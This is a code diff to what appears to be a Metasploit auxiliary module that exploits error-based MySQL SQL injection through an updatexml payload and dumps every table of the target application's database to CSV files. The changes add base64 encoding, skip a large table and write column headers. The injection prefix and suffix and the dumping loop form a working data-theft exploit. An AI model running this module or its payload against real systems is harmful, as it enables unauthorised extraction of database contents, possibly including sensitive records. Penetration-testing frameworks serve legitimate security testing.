@@ -1,4 +1,3 @@
-require 'msf/core'
 require 'csv'
 
 ##
@@ -111,13 +110,14 @@ class MetasploitModule < Msf::Auxiliary
     sqli_opts = {
       prefix: "1' and updatexml(1,concat(0x7e, (",
       suffix: ")),0) or '",
-      truncation_length: 31
+      truncation_length: 31, # slices of 31 bytes of the query response are returned
+      encoder: :base64, # the web application messes up multibyte characters, better encode
+      verbose: datastore['VERBOSE']
     }
     sqli = MySQLi.new(sqli_opts) do |payload|
       res = send_sqli_request(payload)
-      if res && (response = res.body[%r{XPATH syntax error: '~(.*?)'</font>}, 1])
-        # results can include html entities, decoding is necessary to keep length <=31
-        Rex::Text.html_decode(response)
+      if res && (response = res.body[%r{XPATH syntax error: '~(.*?)'</font>}m, 1])
+        response
       else
         ''
       end
@@ -131,6 +131,9 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Identified #{num_tables} tables.")
     # These tables are impossible to fetch because they increase each request
     skiptables = %w[form_taskman log log_comment_encrypt]
+    # large table containing text in different languages, >4mb in size
+    skiptables << 'lang_definitions'
+
     tables.each_with_index do |table, i|
       if skiptables.include?(table)
         print_status("Skipping table (#{i + 1}/#{num_tables}): #{table}")
@@ -138,6 +141,7 @@ class MetasploitModule < Msf::Auxiliary
         columns_of_table = sqli.enum_table_columns('database()', table)
         print_status("Dumping table (#{i + 1}/#{num_tables}): #{table}(#{columns_of_table.join(', ')})")
         table_data = sqli.dump_table_fields('database()', table, columns_of_table)
+        table_data.unshift(columns_of_table)
         save_csv(table_data, table)
       end
     end
